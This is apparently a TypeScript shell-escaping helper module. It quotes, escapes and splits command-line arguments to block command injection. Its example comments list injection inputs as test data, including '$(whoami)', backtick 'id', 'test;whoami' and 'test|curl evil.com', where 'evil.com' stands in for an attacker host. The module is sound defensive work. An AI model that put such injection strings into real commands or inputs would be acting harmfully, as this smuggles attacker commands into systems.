function escapeForSingleQuotedShell(value: string): string {
    return value.replace(/'/g, "'\\''");
}

/**
 * @example
 * shellQuote("/path/to/file with spaces")  // → "'/path/to/file with spaces'"
 * shellQuote("it's here")                  // → "'it'\\''s here'"
 * shellQuote("")                           // → "''"
 */
export function shellQuote(value: string | null | undefined): string {
    if (!value) return "''";
    const escaped = escapeForSingleQuotedShell(value);
    return "'" + escaped + "'";
}

const SHELL_META_CHARS = new Set([
    '\\', '`', ';', '|', '<', '>', '&', '(', ')', '#',
    "'", '"', ' ', '\t',
]);

const SPECIAL_SEQUENCES: Record<string, string> = {
    '$(': '\\$\\(',
    '\r\n': '',
    '\r': '',
    '\n': '',
};

/**
 * @example
 * neutralizeCommandSubstitution("-DFOO=$(whoami)")    // → "-DFOO=\\$\\(whoami\\)"
 * neutralizeCommandSubstitution("-DFOO=`id`")         // → "-DFOO=\\`id\\`"
 * neutralizeCommandSubstitution("-DPATH=$HOME/bin")   // → "-DPATH=$HOME/bin" (preserved)
 * neutralizeCommandSubstitution("-DPATH=${HOME}/bin") // → "-DPATH=${HOME}/bin" (preserved)
 * neutralizeCommandSubstitution("test;whoami")        // → "test\\;whoami"
 * neutralizeCommandSubstitution("test|curl evil.com") // → "test\\|curl evil.com"
 * neutralizeCommandSubstitution("'; whoami; echo '")  // → "\\'\\;\\ whoami\\;\\ echo\\ \\'"
 */
export function neutralizeCommandSubstitution(value: string | null | undefined): string | null | undefined {
    if (!value) return value;

    return value.replace(/\\|`|\$\(|;|\r\n|\r|\n|\||<|>|&|\(|\)|#|'|"| |\t/g, (match) => {
        if (match in SPECIAL_SEQUENCES) return SPECIAL_SEQUENCES[match];
        if (SHELL_META_CHARS.has(match)) return '\\' + match;

        return match;
    });
}

/**
 * @example
 * shellSplit('-DFOO=bar -DBAZ="hello world"')
 * // → ['-DFOO=bar', '-DBAZ=hello world']
 *
 * shellSplit("-DPATH='/usr/local/my app' -DVER=1.0")
 * // → ['-DPATH=/usr/local/my app', '-DVER=1.0']
 *
 * // Full workflow for multi-param inputs:
 * shellSplit(args).map(neutralizeCommandSubstitution).join(' ')
 */
export function shellSplit(value: string | null | undefined): string[] {
    if (!value) return [];

    const tokenRegex = /(?:'[^']*'|"(?:[^"\\]|\\.)*"|\\.|[^\s'"\\]+)+/g;

    const tokens: string[] = [];
    let match: RegExpExecArray | null;

    while ((match = tokenRegex.exec(value)) !== null) {
        const token = match[0]
            .replace(/'([^']*)'/g, '$1')
            .replace(/"((?:[^"\\]|\\.)*)"/g, (_: string, content: string) =>
                content.replace(/\\([$`"\\]|\n)/g, '$1')
            )
            .replace(/\\(.)/g, '$1');

        tokens.push(token);
    }

    return tokens;
}
